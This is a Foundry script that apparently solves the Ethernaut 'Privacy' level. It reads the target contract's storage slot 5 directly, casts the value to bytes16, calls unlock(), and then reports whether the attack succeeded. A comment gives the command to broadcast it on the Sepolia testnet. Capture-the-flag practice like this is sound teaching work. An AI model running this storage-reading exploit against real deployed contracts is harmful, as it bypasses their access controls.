// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Privacy} from "../src/level12.sol";

contract Level12Script is Script {
    function run(address instanceAddress) external {
        Privacy target = Privacy(instanceAddress);
        console.log("Locked status before: ", target.locked());

        vm.startBroadcast();
        bytes32 data = vm.load(address(target), bytes32(uint256(5)));
        console.logBytes32(data);
        target.unlock(bytes16(data));
        vm.stopBroadcast();

        bool isLocked = target.locked();
        console.log("Locked status after: ", isLocked);
        console.log("Attack successful: ", isLocked == false);
    }
}
//forge script script/level12.s.sol:Level12Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account YOUR_KEY --sig "run(address)" YOUR_INSTANCE_ADDRESS
